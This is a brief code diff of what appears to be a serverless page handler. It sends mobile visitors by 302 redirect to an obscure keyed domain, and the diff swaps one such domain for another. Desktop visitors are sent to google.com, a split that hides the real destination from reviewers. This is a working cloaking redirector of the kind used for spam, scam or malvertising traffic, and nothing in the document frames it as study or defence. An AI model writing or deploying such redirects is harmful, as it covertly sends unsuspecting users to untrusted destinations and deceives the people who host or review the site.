@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://distinguishanatotal.com/crzte2apk?key=97d4a937679aa1fac830cb0c8f5b1069", 302);
+    return Response.redirect("https://elseconcerning.com/zzwwa40fvi?key=9bf904414ec1ea4ac8044f849e93c086", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
